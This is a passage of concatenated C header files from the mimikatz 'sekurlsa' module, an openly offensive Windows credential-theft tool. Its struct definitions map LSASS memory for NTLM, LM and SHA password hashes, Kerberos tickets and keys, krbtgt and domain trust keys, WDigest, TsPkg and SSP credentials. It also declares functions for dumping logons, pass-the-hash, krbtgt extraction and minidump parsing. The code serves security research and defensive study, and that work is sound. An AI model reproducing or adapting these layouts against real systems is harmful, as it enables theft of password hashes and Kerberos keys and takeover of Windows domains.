	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_60, *PKIWI_KERBEROS_INTERNAL_TICKET_60;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_6 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	LSA_UNICODE_STRING	KDCServer;	//?
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_6, *PKIWI_KERBEROS_INTERNAL_TICKET_6;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_10 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	LSA_UNICODE_STRING	KDCServer;	//?
	LSA_UNICODE_STRING	unk10586_d;	//?
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_10, *PKIWI_KERBEROS_INTERNAL_TICKET_10;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_10_1607 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	LSA_UNICODE_STRING	KDCServer;	//?
	LSA_UNICODE_STRING	unk10586_d;	//?
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	PVOID		unk14393_0;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk14393_1;
	PVOID		unk3; // ULONG		KeyType2;
	PVOID		unk4; // KIWI_KERBEROS_BUFFER	Key2;
	PVOID		unk5; // up
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_10_1607, *PKIWI_KERBEROS_INTERNAL_TICKET_10_1607;

typedef struct _KERB_HASHPASSWORD_GENERIC {
	DWORD Type;
	SIZE_T Size;
	PBYTE Checksump;
} KERB_HASHPASSWORD_GENERIC, *PKERB_HASHPASSWORD_GENERIC;

typedef struct _KERB_HASHPASSWORD_5 {
	LSA_UNICODE_STRING salt;	// http://tools.ietf.org/html/rfc3962
	KERB_HASHPASSWORD_GENERIC generic;
} KERB_HASHPASSWORD_5, *PKERB_HASHPASSWORD_5;

typedef struct _KERB_HASHPASSWORD_6 {
	LSA_UNICODE_STRING salt;	// http://tools.ietf.org/html/rfc3962
	PVOID stringToKey; // AES Iterations (dword ?)
	KERB_HASHPASSWORD_GENERIC generic;
} KERB_HASHPASSWORD_6, *PKERB_HASHPASSWORD_6;

typedef struct _KERB_HASHPASSWORD_6_1607 {
	LSA_UNICODE_STRING salt;	// http://tools.ietf.org/html/rfc3962
	PVOID stringToKey; // AES Iterations (dword ?)
	PVOID unk0;
	KERB_HASHPASSWORD_GENERIC generic;
} KERB_HASHPASSWORD_6_1607, *PKERB_HASHPASSWORD_6_1607;

typedef struct _KIWI_KERBEROS_KEYS_LIST_5 {
	DWORD unk0;		// dword_1233EC8 dd 4
	DWORD cbItem;	// debug048:01233ECC dd 5
	PVOID unk1;
	PVOID unk2;
	//KERB_HASHPASSWORD_5 KeysEntries[ANYSIZE_ARRAY];
} KIWI_KERBEROS_KEYS_LIST_5, *PKIWI_KERBEROS_KEYS_LIST_5;

typedef struct _KIWI_KERBEROS_KEYS_LIST_6 {
	DWORD unk0;		// dword_1233EC8 dd 4
	DWORD cbItem;	// debug048:01233ECC dd 5
	PVOID unk1;
	PVOID unk2;
	PVOID unk3;
	PVOID unk4;
	//KERB_HASHPASSWORD_6 KeysEntries[ANYSIZE_ARRAY];
} KIWI_KERBEROS_KEYS_LIST_6, *PKIWI_KERBEROS_KEYS_LIST_6;

typedef struct _KIWI_KERBEROS_ENUM_DATA_TICKET {
	BOOL isTicketExport;
	BOOL isFullTicket;
} KIWI_KERBEROS_ENUM_DATA_TICKET, *PKIWI_KERBEROS_ENUM_DATA_TICKET;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"
#if !defined(_M_ARM64)
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_livessp_package;

NTSTATUS kuhl_m_sekurlsa_livessp(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _KIWI_LIVESSP_PRIMARY_CREDENTIAL
{
	ULONG isSupp;
	ULONG unk0;
	KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
} KIWI_LIVESSP_PRIMARY_CREDENTIAL, *PKIWI_LIVESSP_PRIMARY_CREDENTIAL;

typedef struct _KIWI_LIVESSP_LIST_ENTRY
{
	struct _KIWI_LIVESSP_LIST_ENTRY *Flink;
	struct _KIWI_LIVESSP_LIST_ENTRY *Blink;
	PVOID	unk0;
	PVOID	unk1;
	PVOID	unk2;
	PVOID	unk3;
	DWORD	unk4;
	DWORD	unk5;
	PVOID	unk6;
	LUID	LocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	PVOID	unk7;
	PKIWI_LIVESSP_PRIMARY_CREDENTIAL suppCreds;
} KIWI_LIVESSP_LIST_ENTRY, *PKIWI_LIVESSP_LIST_ENTRY;
#endif

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"
//#include "../kuhl_m_sekurlsa_utils.h"
//#include "../modules/kull_m_crypto_system.h"
//#include "../modules/rpc/kull_m_rpc_ms-credentialkeys.h"

typedef struct _MSV1_0_PRIMARY_CREDENTIAL { 
	LSA_UNICODE_STRING LogonDomainName; 
	LSA_UNICODE_STRING UserName;
	BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE ShaOwPassword[SHA_DIGEST_LENGTH];
	BOOLEAN isNtOwfPassword;
	BOOLEAN isLmOwfPassword;
	BOOLEAN isShaOwPassword;
	/* buffer */
} MSV1_0_PRIMARY_CREDENTIAL, *PMSV1_0_PRIMARY_CREDENTIAL;

typedef struct _MSV1_0_PRIMARY_CREDENTIAL_10_OLD { 
	LSA_UNICODE_STRING LogonDomainName; 
	LSA_UNICODE_STRING UserName;
	BOOLEAN isIso;
	BOOLEAN isNtOwfPassword;
	BOOLEAN isLmOwfPassword;
	BOOLEAN isShaOwPassword;
	BYTE align0;
	BYTE align1;
	BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE ShaOwPassword[SHA_DIGEST_LENGTH];
	/* buffer */
} MSV1_0_PRIMARY_CREDENTIAL_10_OLD, *PMSV1_0_PRIMARY_CREDENTIAL_10_OLD;

typedef struct _MSV1_0_PRIMARY_CREDENTIAL_10 { 
	LSA_UNICODE_STRING LogonDomainName; 
	LSA_UNICODE_STRING UserName;
	BOOLEAN isIso;
	BOOLEAN isNtOwfPassword;
	BOOLEAN isLmOwfPassword;
	BOOLEAN isShaOwPassword;
	BYTE align0;
	BYTE align1;
	BYTE align2;
	BYTE align3;
	BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE ShaOwPassword[SHA_DIGEST_LENGTH];
	/* buffer */
} MSV1_0_PRIMARY_CREDENTIAL_10, *PMSV1_0_PRIMARY_CREDENTIAL_10;

typedef struct _MSV1_0_PRIMARY_CREDENTIAL_10_1607 { 
	LSA_UNICODE_STRING LogonDomainName; 
	LSA_UNICODE_STRING UserName;
	PVOID pNtlmCredIsoInProc;
	BOOLEAN isIso;
	BOOLEAN isNtOwfPassword;
	BOOLEAN isLmOwfPassword;
	BOOLEAN isShaOwPassword;
	BOOLEAN isDPAPIProtected;
	BYTE align0;
	BYTE align1;
	BYTE align2;
	DWORD unkD; // 1/2
	#pragma pack(push, 2)
	WORD isoSize;  // 0000
	BYTE DPAPIProtected[LM_NTLM_HASH_LENGTH];
	DWORD align3; // 00000000
	#pragma pack(pop) 
	BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE ShaOwPassword[SHA_DIGEST_LENGTH];
	/* buffer */
} MSV1_0_PRIMARY_CREDENTIAL_10_1607, *PMSV1_0_PRIMARY_CREDENTIAL_10_1607;

typedef struct _MSV1_0_PRIMARY_HELPER {
	LONG offsetToLogonDomain;
	LONG offsetToUserName;
	LONG offsetToisIso;
	LONG offsetToisNtOwfPassword;
	LONG offsetToisLmOwfPassword;
	LONG offsetToisShaOwPassword;
	LONG offsetToisDPAPIProtected;
	LONG offsetToNtOwfPassword;
	LONG offsetToLmOwfPassword;
	LONG offsetToShaOwPassword;
	LONG offsetToDPAPIProtected;
	LONG offsetToIso;
} MSV1_0_PRIMARY_HELPER, *PMSV1_0_PRIMARY_HELPER;

typedef struct _MSV1_0_PTH_DATA_CRED { 
	PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pSecData;
	PSEKURLSA_PTH_DATA pthData;
} MSV1_0_PTH_DATA_CRED, *PMSV1_0_PTH_DATA_CRED;

typedef struct _MSV1_0_STD_DATA {
	PLUID						LogonId;
} MSV1_0_STD_DATA, *PMSV1_0_STD_DATA;

typedef BOOL (CALLBACK * PKUHL_M_SEKURLSA_MSV_CRED_CALLBACK) (IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS * pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData);

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package;
NTSTATUS kuhl_m_sekurlsa_msv(int argc, wchar_t * argv[]);

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);

VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID pCredentials, IN PKUHL_M_SEKURLSA_MSV_CRED_CALLBACK credCallback, IN PVOID optionalData);
BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS * pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData);
BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS * pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData);

const MSV1_0_PRIMARY_HELPER * kuhl_m_sekurlsa_msv_helper(PKUHL_M_SEKURLSA_CONTEXT context);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_ssp_package;

NTSTATUS kuhl_m_sekurlsa_ssp(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _KIWI_SSP_CREDENTIAL_LIST_ENTRY {
	struct _KIWI_SSP_CREDENTIAL_LIST_ENTRY *Flink;
	struct _KIWI_SSP_CREDENTIAL_LIST_ENTRY *Blink;
	ULONG References;
	ULONG CredentialReferences;
	LUID LogonId;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
} KIWI_SSP_CREDENTIAL_LIST_ENTRY, *PKIWI_SSP_CREDENTIAL_LIST_ENTRY;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_tspkg_package;

NTSTATUS kuhl_m_sekurlsa_tspkg(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _KIWI_TS_PRIMARY_CREDENTIAL {
	PVOID unk0;	// lock ?
	KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
} KIWI_TS_PRIMARY_CREDENTIAL, *PKIWI_TS_PRIMARY_CREDENTIAL;

typedef struct _KIWI_TS_CREDENTIAL {
#if defined(_M_X64) || defined(_M_ARM64)
	BYTE unk0[108];
#elif defined(_M_IX86)
	BYTE unk0[64];
#endif
	LUID LocallyUniqueIdentifier;
	PVOID unk1;
	PVOID unk2;
	PKIWI_TS_PRIMARY_CREDENTIAL pTsPrimary;
} KIWI_TS_CREDENTIAL, *PKIWI_TS_CREDENTIAL;

typedef struct _KIWI_TS_CREDENTIAL_1607 {
#if defined(_M_X64) || defined(_M_ARM64)
	BYTE unk0[112];
#elif defined(_M_IX86)
	BYTE unk0[68];
#endif
	LUID LocallyUniqueIdentifier;
	PVOID unk1;
	PVOID unk2;
	PKIWI_TS_PRIMARY_CREDENTIAL pTsPrimary;
} KIWI_TS_CREDENTIAL_1607, *PKIWI_TS_CREDENTIAL_1607;

typedef struct _KIWI_TS_CREDENTIAL_HELPER {
	LONG offsetToLuid;
	LONG offsetToTsPrimary;
} KIWI_TS_CREDENTIAL_HELPER, *PKIWI_TS_CREDENTIAL_HELPER;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_wdigest_package;

NTSTATUS kuhl_m_sekurlsa_wdigest(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _KIWI_WDIGEST_LIST_ENTRY {
	struct _KIWI_WDIGEST_LIST_ENTRY *Flink;
	struct _KIWI_WDIGEST_LIST_ENTRY *Blink;
	ULONG	UsageCount;
	struct _KIWI_WDIGEST_LIST_ENTRY *This;
	LUID LocallyUniqueIdentifier;
} KIWI_WDIGEST_LIST_ENTRY, *PKIWI_WDIGEST_LIST_ENTRY;



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "../modules/kull_m_patch.h"
//#include "../modules/kull_m_process.h"
//#include "../modules/kull_m_handle.h"
//#include "../modules/rpc/kull_m_rpc.h"



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m.h"
//#include "globals_sekurlsa.h"

//#include "kuhl_m_sekurlsa_utils.h"
//#include "crypto/kuhl_m_sekurlsa_nt5.h"
//#include "crypto/kuhl_m_sekurlsa_nt6.h"
#if defined(LSASS_DECRYPT)
//#include "crypto/kuhl_m_sekurlsa_nt63.h"
#endif

//#include "packages/kuhl_m_sekurlsa_kerberos.h"
//#include "packages/kuhl_m_sekurlsa_livessp.h"
//#include "packages/kuhl_m_sekurlsa_msv1_0.h"
//#include "packages/kuhl_m_sekurlsa_ssp.h"
//#include "packages/kuhl_m_sekurlsa_tspkg.h"
//#include "packages/kuhl_m_sekurlsa_wdigest.h"
//#include "packages/kuhl_m_sekurlsa_dpapi.h"
//#include "packages/kuhl_m_sekurlsa_credman.h"
//#include "packages/kuhl_m_sekurlsa_cloudap.h"

//#include "../kerberos/kuhl_m_kerberos_ticket.h"
//#include "../kuhl_m_lsadump.h"

#define KUHL_SEKURLSA_CREDS_DISPLAY_RAW					0x00000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_LINE				0x00000001
#define KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE				0x00000002

#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL			0x08000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY				0x01000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY		0x02000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK		0x07000000

#define KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10			0x00100000
#define KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST			0x00200000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS			0x00400000
#define KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE				0x00800000
#define KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607	0x00010000

#define KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT			0x00001000

#define KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT			0x10000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY			0x20000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN				0x40000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_SSP					0x80000000

const KUHL_M kuhl_m_sekurlsa;

NTSTATUS kuhl_m_sekurlsa_init();
NTSTATUS kuhl_m_sekurlsa_clean();

VOID kuhl_m_sekurlsa_reset();

NTSTATUS kuhl_m_sekurlsa_acquireLSA();

BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);

BOOL kuhl_m_sekurlsa_validateAdjustUnicodeBuffer(PUNICODE_STRING pString, PVOID pBaseBuffer, PMEMORY_BASIC_INFORMATION pMemoryBasicInformation);
NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData);
void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages);
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);
VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data);
VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags);
VOID kuhl_m_sekurlsa_trymarshal(PCUNICODE_STRING MarshaledCredential);
VOID kuhl_m_sekurlsa_genericKeyOutput(struct _KIWI_CREDENTIAL_KEY * key, LPCWSTR sid);
BOOL kuhl_m_sekurlsa_genericLsaIsoOutput(struct _LSAISO_DATA_BLOB * blob, LPBYTE *output, DWORD *cbOutput);
VOID kuhl_m_sekurlsa_genericEncLsaIsoOutput(struct _ENC_LSAISO_DATA_BLOB * blob, DWORD size);
void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, BOOL isExport);
#if !defined(_M_ARM64)
void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix);
#endif
void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCWSTR prefix, BOOL incoming, PCUNICODE_STRING domain);
void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info);

NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[]);
#if !defined(_M_ARM64)
NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[]);
#endif
NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_bkeys(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[]);

typedef struct _KUHL_M_SEKURLSA_ENUM_HELPER {
	SIZE_T tailleStruct;
	ULONG offsetToLuid;
	ULONG offsetToLogonType;
	ULONG offsetToSession;
	ULONG offsetToUsername;
	ULONG offsetToDomain;
	ULONG offsetToCredentials;
	ULONG offsetToPSid;
	ULONG offsetToCredentialManager;
	ULONG offsetToLogonTime;
	ULONG offsetToLogonServer;
} KUHL_M_SEKURLSA_ENUM_HELPER, *PKUHL_M_SEKURLSA_ENUM_HELPER;

typedef struct _KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA {
	const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages;
	ULONG nbPackages;
} KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA, *PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA;

typedef struct _KIWI_KRBTGT_CREDENTIAL_64 {
	PVOID unk0;
	PVOID unk1_key_salt;
	PVOID flags;
	PVOID unk2; //
	PVOID type;
	PVOID size;
	PVOID key;
} KIWI_KRBTGT_CREDENTIAL_64, *PKIWI_KRBTGT_CREDENTIAL_64;

typedef struct _KIWI_KRBTGT_CREDENTIALS_64 {
	DWORD unk0_ver;
	DWORD cbCred;
	PVOID unk1;
	LSA_UNICODE_STRING salt;
	PVOID unk2;
	KIWI_KRBTGT_CREDENTIAL_64 credentials[ANYSIZE_ARRAY];
} KIWI_KRBTGT_CREDENTIALS_64, *PKIWI_KRBTGT_CREDENTIALS_64;

typedef struct _KIWI_KRBTGT_CREDENTIAL_6 {
	PVOID unk0;
	PVOID unk1_key_salt;
	PVOID flags;
	PVOID type;
	PVOID size;
	PVOID key;
} KIWI_KRBTGT_CREDENTIAL_6, *PKIWI_KRBTGT_CREDENTIAL_6;

typedef struct _KIWI_KRBTGT_CREDENTIALS_6 {
	DWORD unk0_ver;
	DWORD cbCred;
	PVOID unk1;
	LSA_UNICODE_STRING salt;
	PVOID unk2;
	KIWI_KRBTGT_CREDENTIAL_6 credentials[ANYSIZE_ARRAY];
} KIWI_KRBTGT_CREDENTIALS_6, *PKIWI_KRBTGT_CREDENTIALS_6;

typedef struct _KIWI_KRBTGT_CREDENTIAL_5 {
	PVOID unk0;
	PVOID unk1_key_salt;
	PVOID type;
	PVOID size;
	PVOID key;
} KIWI_KRBTGT_CREDENTIAL_5, *PKIWI_KRBTGT_CREDENTIAL_5;

typedef struct _KIWI_KRBTGT_CREDENTIALS_5 {
	DWORD unk0_ver;
	DWORD cbCred;
	LSA_UNICODE_STRING salt;
	KIWI_KRBTGT_CREDENTIAL_5 credentials[ANYSIZE_ARRAY];
} KIWI_KRBTGT_CREDENTIALS_5, *PKIWI_KRBTGT_CREDENTIALS_5;

typedef struct _DUAL_KRBTGT {
	PVOID krbtgt_current;
	PVOID krbtgt_previous;
} DUAL_KRBTGT, *PDUAL_KRBTGT;

typedef struct _KDC_DOMAIN_KEY {
	LONG	type;
	DWORD	size;
	DWORD	offset;
} KDC_DOMAIN_KEY, *PKDC_DOMAIN_KEY;

typedef struct _KDC_DOMAIN_KEYS {
	DWORD		keysSize; //60
	DWORD		unk0;
	DWORD		nbKeys;
	KDC_DOMAIN_KEY keys[ANYSIZE_ARRAY];
} KDC_DOMAIN_KEYS, *PKDC_DOMAIN_KEYS;

typedef struct _KDC_DOMAIN_KEYS_INFO {
	PKDC_DOMAIN_KEYS	keys;
	DWORD				keysSize; //60
	LSA_UNICODE_STRING	password;
} KDC_DOMAIN_KEYS_INFO, *PKDC_DOMAIN_KEYS_INFO;

typedef struct _KDC_DOMAIN_INFO {
	LIST_ENTRY list;
	LSA_UNICODE_STRING	FullDomainName;
	LSA_UNICODE_STRING	NetBiosName;
	PVOID		current;
	DWORD		unk1;	// 4		// 0
	DWORD		unk2;	// 8		// 32
	DWORD		unk3;	// 2		// 0
	DWORD		unk4;	// 1		// 1
	PVOID		unk5;	// 8*0
	DWORD		unk6;	// 3		// 2
	// align
	PSID		DomainSid;
	KDC_DOMAIN_KEYS_INFO	IncomingAuthenticationKeys;
	KDC_DOMAIN_KEYS_INFO	OutgoingAuthenticationKeys;
	KDC_DOMAIN_KEYS_INFO	IncomingPreviousAuthenticationKeys;
	KDC_DOMAIN_KEYS_INFO	OutgoingPreviousAuthenticationKeys;
} KDC_DOMAIN_INFO , *PKDC_DOMAIN_INFO;

typedef struct _LSAISO_DATA_BLOB {
	DWORD structSize;
	DWORD unk0;
	DWORD typeSize;
	DWORD unk1;
	DWORD unk2;
	DWORD unk3;
	DWORD unk4;
	BYTE KdfContext[32];
	BYTE Tag[16];
	DWORD unk5; // AuthData start
	DWORD unk6;
	DWORD unk7;
	DWORD unk8;
	DWORD unk9;
	DWORD szEncrypted; // AuthData ends + type
	BYTE data[ANYSIZE_ARRAY]; // Type then Encrypted
} LSAISO_DATA_BLOB, *PLSAISO_DATA_BLOB;

typedef struct _ENC_LSAISO_DATA_BLOB {
	BYTE unkData1[16];
	BYTE unkData2[16];
	BYTE data[ANYSIZE_ARRAY];
} ENC_LSAISO_DATA_BLOB, *PENC_LSAISO_DATA_BLOB;

//#include "../dpapi/kuhl_m_dpapi_oe.h"
//#include "kuhl_m_sekurlsa_sk.h"

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals_sekurlsa.h"
//#include "../modules/kull_m_crypto_sk.h"
//#include "kuhl_m_sekurlsa.h"

typedef struct _KEYLIST_ENTRY {
	LIST_ENTRY navigator;
	BYTE key[32];
	DOUBLE entropy;
} KEYLIST_ENTRY, *PKEYLIST_ENTRY;

BOOL kuhl_m_sekurlsa_sk_candidatekey_add(BYTE key[32], DOUBLE entropy);
void kuhl_m_sekurlsa_sk_candidatekey_delete(PKEYLIST_ENTRY entry);
void kuhl_m_sekurlsa_sk_candidatekey_descr(PKEYLIST_ENTRY entry);
void kuhl_m_sekurlsa_sk_candidatekeys_delete();
void kuhl_m_sekurlsa_sk_candidatekeys_descr();

